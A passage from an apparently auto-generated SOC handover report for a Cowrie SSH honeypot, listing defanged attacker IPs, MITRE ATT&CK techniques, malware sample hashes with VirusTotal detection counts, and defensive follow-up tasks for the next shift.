| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 04:33:26` | `cowrie.session.connect` |
| `2026-04-25 04:33:26` | `cowrie.client.version` |
| `2026-04-25 04:33:26` | `cowrie.client.kex` |
| `2026-04-25 04:33:27` | `cowrie.login.success` |
| `2026-04-25 04:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.101[.]169` to AbuseIPDB if not already reported
- [ ] Block `160.251.101[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.29.255[.]113` | **28** | 2026-04-25 02:46 | 2026-04-25 02:58 | 50m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `160.251.101[.]169` | **27** | 2026-04-25 04:01 | 2026-04-25 04:40 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.72.108[.]18` | **18** | 2026-04-25 04:46 | 2026-04-25 04:53 | 26m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.168.201[.]212` | **13** | 2026-04-25 04:46 | 2026-04-25 04:49 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.65[.]63` | **6** | 2026-04-25 05:24 | 2026-04-25 05:48 | 4m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `148.66.132[.]204` | **3** | 2026-04-25 02:46 | 2026-04-25 02:48 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `106.75.1[.]153` | **2** | 2026-04-25 02:46 | 2026-04-25 02:48 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.102.116[.]62` | **2** | 2026-04-25 05:12 | 2026-04-25 05:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.228.58[.]144` | 1 | 2026-04-25 04:19 | 2026-04-25 04:19 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.178.141[.]47` | 1 | 2026-04-25 04:54 | 2026-04-25 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.109[.]71` | 1 | 2026-04-25 05:24 | 2026-04-25 05:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]233` | 1 | 2026-04-25 05:46 | 2026-04-25 05:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]5` | 1 | 2026-04-25 02:48 | 2026-04-25 02:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.248.83[.]33` | 1 | 2026-04-25 04:00 | 2026-04-25 04:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.6[.]144` | 1 | 2026-04-25 05:14 | 2026-04-25 05:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.104.147[.]6` | 1 | 2026-04-25 02:48 | 2026-04-25 02:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]87` | 1 | 2026-04-25 05:34 | 2026-04-25 05:34 | 10s | 0 | `T1592` | 🟢 LOW |
| `8.219.8[.]101` | 1 | 2026-04-25 03:05 | 2026-04-25 03:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.159.101[.]249` | 1 | 2026-04-25 03:19 | 2026-04-25 03:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `206.168.201[.]212` | PK | B-Rock Crude | **100** ⚠️ | 0 |
| `71.6.199[.]87` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `118.178.141[.]47` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 0 |
| `14.103.115[.]5` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `117.72.108[.]18` | CN | Beijing Jingdong 360 Degree E-commerce Co., Ltd. | **100** ⚠️ | 5 |
| `101.29.255[.]113` | CN | China Unicom Hebei province network | **100** ⚠️ | 7 |
| `14.103.109[.]71` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.115[.]233` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `36.104.147[.]6` | CN | CHINANET Zhejiang province network | **100** ⚠️ | 50 |
| `148.66.132[.]204` | SG | Godaddy.com | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 116 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 42 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 144 cases |
| Tool 34  | Credential Extractor        | ✅ 69 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (4.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 19 recon entry/entries in table (8 group(s) consolidating 99 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T05:51:20Z_
